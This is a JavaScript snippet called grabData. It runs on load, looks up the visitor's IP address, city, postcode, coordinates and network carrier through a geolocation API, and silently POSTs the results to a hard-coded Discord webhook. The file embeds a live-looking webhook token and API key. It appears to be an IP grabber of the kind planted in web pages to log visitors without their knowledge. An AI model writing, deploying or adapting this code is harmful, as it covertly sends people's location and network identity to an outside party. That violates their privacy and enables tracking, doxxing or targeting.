const grabData = async () => {
  const webhookURL = "https://discord.com/api/webhooks/1381607953949524108/uSbzkt2ULBdiLdbTVE8P13LGmqgifLcWtCzFfLr-fXlbjx-SL1gS3vUnZ-qp1F27pZtr"; // Replace this with your actual webhook URL
  const apiUrl = "https://api.bigdatacloud.net/data/ip-geolocation-full?localityLanguage=en&key=bdc_77754f0976fd44bcb2c57392b7aef84a";

  const res = await fetch(apiUrl);
  const data = await res.json();

  const filtered = {
    ip: data.ip,
    localityLanguageRequested: data.localityLanguageRequested,
    isReachableGlobally: data.isReachableGlobally,
    securityThreat: data.securityThreat,
    hazardReport: data.hazardReport,
    country: {
      isoAlpha2: data.country.isoAlpha2,
      name: data.country.name,
      countryFlagEmoji: data.country.countryFlagEmoji,
      wikidataId: data.country.wikidataId,
      geonameId: data.country.geonameId,
    },
    location: {
      principalSubdivision: data.location.principalSubdivision,
      isoPrincipalSubdivision: data.location.isoPrincipalSubdivision,
      isoPrincipalSubdivisionCode: data.location.isoPrincipalSubdivisionCode,
      continent: data.location.continent,
      continentCode: data.location.continentCode,
      city: data.location.city,
      localityName: data.location.localityName,
      postcode: data.location.postcode,
      latitude: data.location.latitude,
      longitude: data.location.longitude,
      plusCode: data.location.plusCode,
      timeZone: data.location.timeZone,
      localityInfo: data.location.localityInfo
    },
    lastUpdated: data.lastUpdated,
    network: {
      registry: data.network.registry,
      registryStatus: data.network.registryStatus,
      registeredCountry: data.network.registeredCountry,
      registeredCountryName: data.network.registeredCountryName,
      organisation: data.network.organisation,
      isReachableGlobally: data.network.isReachableGlobally,
      isBogon: data.network.isBogon,
      bgpPrefix: data.network.bgpPrefix,
      bgpPrefixNetworkAddress: data.network.bgpPrefixNetworkAddress,
      bgpPrefixLastAddress: data.network.bgpPrefixLastAddress,
      totalAddresses: data.network.totalAddresses,
      carriers: data.network.carriers,
      viaCarriers: data.network.viaCarriers
    }
  };

  const toFieldValue = (obj) => {
    if (obj === null || obj === undefined) return "N/A";
    if (typeof obj === "string" || typeof obj === "number" || typeof obj === "boolean") {
      return String(obj);
    }
    if (Array.isArray(obj)) {
      if (obj.length === 0) return "N/A";
      return obj.map(item => {
        if (typeof item === "object") {
          if (item.asn) {
            return `ASN: ${item.asn} - Org: ${item.organisation || item.name || "N/A"}`;
          }
          if (item.name) {
            return `Name: ${item.name} - Desc: ${item.description || "N/A"}`;
          }
          return JSON.stringify(item);
        }
        return item;
      }).join("\n");
    }
    if (typeof obj === "object") {
      return Object.entries(obj).map(([k,v]) => `${k}: ${v}`).join("\n");
    }
    return JSON.stringify(obj);
  };

  const fields = Object.entries(filtered).map(([key, val]) => ({
    name: key,
    value: toFieldValue(val).slice(0, 1024) || "N/A"
  }));

  const embed = {
    title: "IP Geolocation Selected Data",
    color: 0x3498db,
    fields,
    footer: {
      text: `🕒 ${new Date().toLocaleString()}`,
      icon_url: "https://cdn-icons-png.flaticon.com/512/2088/2088617.png"
    }
  };

  const payload = {
    username: "drinzy",
    avatar_url: "https://cdn-icons-png.flaticon.com/512/7013/7013144.png",
    embeds: [embed]
  };

  const req = new XMLHttpRequest();
  req.open("POST", webhookURL);
  req.setRequestHeader("Content-Type", "application/json");
  req.send(JSON.stringify(payload));
};

grabData();
